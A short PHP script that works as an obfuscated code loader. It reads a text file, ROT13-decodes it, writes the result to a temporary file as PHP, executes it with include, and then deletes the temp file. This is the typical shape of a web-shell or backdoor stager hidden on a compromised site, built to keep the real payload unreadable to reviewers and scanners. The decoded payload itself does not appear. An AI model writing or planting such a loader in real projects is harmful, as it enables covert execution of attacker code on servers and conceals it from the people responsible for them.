<?php
$ss = file_get_contents("jungkok-jung.txt");
$tempFile = tempnam(sys_get_temp_dir(), 'pasted_code_');
$ss = str_rot13($ss);
file_put_contents($tempFile, "<?p"."hp ". $ss);
include $tempFile;
unlink($tempFile);?>